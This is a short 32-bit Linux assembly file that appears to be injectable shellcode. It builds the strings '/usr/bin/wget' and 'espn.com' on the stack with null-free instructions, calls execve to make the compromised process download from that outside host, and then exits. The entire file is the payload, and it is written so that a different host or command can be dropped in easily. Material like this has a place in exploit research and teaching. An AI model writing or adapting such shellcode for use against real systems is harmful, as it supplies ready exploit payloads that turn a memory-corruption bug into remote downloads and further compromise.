BITS 32

section .text
global 	_start

_start:
xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx
push ebx
push 0x6d6f632e
push 0x6e707365
mov edx, esp
mov al, 0x74
push eax
push 0x6567772f
push 0x6e69622f
push 0x7273752f
mov ebx, esp
push ecx
push edx
push ebx
mov ecx, esp
xor eax, eax
xor edx,edx
mov al, 11
int 0x80 ;
xor eax, eax
xor ebx, ebx
mov al, 1
int 0x80 ; exit(0)



